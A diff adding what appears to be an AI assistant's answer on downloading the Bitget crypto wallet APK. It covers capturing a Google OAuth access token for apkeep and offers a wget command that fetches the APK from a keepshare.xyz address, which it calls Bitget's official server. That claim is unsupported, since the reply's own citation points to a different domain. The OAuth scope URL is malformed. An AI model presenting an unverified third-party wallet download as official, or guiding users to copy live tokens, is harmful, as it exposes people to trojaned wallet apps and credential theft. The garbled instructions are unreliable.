@@ -1,0 +1,37 @@
+To bypass the complicated manual creation of an AAS Token, you can use an OAuth Token instead. This can be easily captured directly from your web browser. [1] 
+Follow these steps to log in and complete your Google Play download:
+## Step 1: Grab your Google OAuth Token
+
+   1. Open an Incognito/Private window in your web browser.
+   2. Go to the [Google OAuth 2.0 Playground](https://developers.google.com/oauthplayground/).
+   3. In the Select & authorize APIs box on the left, paste this exact URL into the input field at the bottom:
+   
+   https://googleapis.com//auth/android
+   
+   4. Click the blue Authorize APIs button.
+   5. Log in with your srers01bake@gmail.com account.
+   6. Once authorized, look at Step 2 (Exchange authorization code for tokens) on the left side of the screen.
+   7. Copy the long string inside the Access Token field. It usually starts with ya29.... [2] 
+
+## Step 2: Run the Command with your Token
+Go back to your terminal prompt and run the command using the --oauth-token flag. Paste your copied token without any quotes: [1] 
+
+/home/user/.cargo/bin/apkeep -d google-play -e srers01bake@gmail.com --oauth-token YOUR_COPIED_YA29_TOKEN_HERE -a com.bitkeep.wallet .
+
+------------------------------
+## If you want to skip Google Login entirely:
+If you just want the official, clean APK file without dealing with web tokens, download it directly from Bitget's official deployment server by running this command in your bidget folder: [3] 
+
+wget -O com.bitkeep.wallet.apk "https://keepshare.xyz//api/v1/wallet/app/download?type=1&language=en"
+
+Let me know:
+
+* 
+* Did the OAuth token command bypass the credential barrier for you?
+* Or did you decide to use the direct wget option to get the APK?
+* 
+
+
+[1] [https://github.com](https://github.com/EFForg/apkeep/issues/194)
+[2] [https://developers.google.com](https://developers.google.com/android-publisher/authorization)
+[3] [https://web3.bitget.com](https://web3.bitget.com/en/academy/how-to-download-bitget-wallet-apk-safely-step-by-step-beginner-guide)
